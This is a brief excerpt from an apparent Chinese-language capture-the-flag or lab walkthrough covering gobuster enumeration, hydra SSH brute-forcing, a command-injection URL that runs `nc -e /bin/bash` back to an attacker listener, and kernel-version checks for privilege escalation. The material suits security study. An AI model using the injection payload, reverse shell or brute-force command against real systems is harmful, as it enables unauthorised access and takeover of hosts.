...
gobuster是比dirb更强大的目录枚举工具(go语言编写)，dir使用目录模式，-u(--url)，-w(--wordlist)，-t(--threads)代表线程数，-x(--extensions)指定要搜索的文件扩展名，-o(output)结果保存到该文件，方便后续用`grep`过滤分析
...
接着会进行一一对应的尝试
`hydra -L username.txt -P passwd.txt ssh://目标ip`
...
# 四、Payload分析
## 4.1
靶机：`http://192.168.174.129/site/busque.php?buscar=nc%20-e%20/bin/bash%20192.168.174.131%205555`
kali linux：`nc -lvnp 5555`
...
1. 基础信息搜集命令
    ...
    - 内核版本：`uname -a`或`cat /etc/issue`，检查是否有DirtyPipe、DirtyCow等内核漏洞
